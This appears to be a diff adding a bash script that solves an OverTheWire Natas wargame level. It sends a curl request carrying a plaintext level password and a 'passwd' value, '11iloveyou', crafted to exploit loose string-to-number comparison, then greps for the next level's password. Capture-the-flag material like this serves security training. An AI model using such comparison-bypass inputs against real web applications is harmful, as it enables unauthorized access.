@@ -1,0 +1,4 @@
+#!/bin/bash
+
+# 11iloveyou > 10
+curl --user natas23:D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE http://natas23.natas.labs.overthewire.org/?passwd=11iloveyou 2>&1 | grep Password  
